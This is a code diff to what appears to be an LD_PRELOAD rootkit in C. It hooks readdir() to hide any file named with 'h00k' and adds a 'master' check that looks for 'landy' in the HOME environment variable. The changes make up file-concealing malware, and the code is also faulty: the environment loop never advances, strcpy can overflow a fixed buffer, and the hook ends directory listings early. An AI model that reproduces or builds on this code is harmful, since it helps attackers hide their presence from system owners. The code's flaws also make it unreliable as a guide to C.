@@ -14,8 +14,24 @@
 
 #define keyword "landy"
 
+extern char **environ;
+
 int ismaster(){
     //TODO find a good way to verify that master is master
+    int i = 0;
+    char homepath[256];
+
+    while(environ[i]){
+	if(strstr(environ[i],"HOME=")){
+	    strcpy(homepath,strstr(environ[i],"HOME="));
+	    //idk if this works :(
+	    if(strstr(homepath, keyword)){
+		return 0;
+	    }
+	}
+    }
+    return 1;
+
 }
 
 //delcare the old functions :)
@@ -46,15 +62,13 @@ struct dirent *readdir(DIR *dirp){
 	old_readdir = dlsym(RTLD_NEXT,"readdir");
     }
     
-    //TODO look into dirfd()
+    dir = old_readdir(dirp);
+    
+    //hides via keyword. Needs more testing
+    if(strstr(dir->d_name,"h00k")) return 0;
 
-    //dir = old_readdir(dirp);
-    //printf("%s",dir->d_name);
-    //if(strstr(dir->d_name,keyword)){
-	//printf("Hello");
-   // }
-
-    return old_readdir(dirp);
+    //printf("hit\n");
+    return dir;
 
 }
 
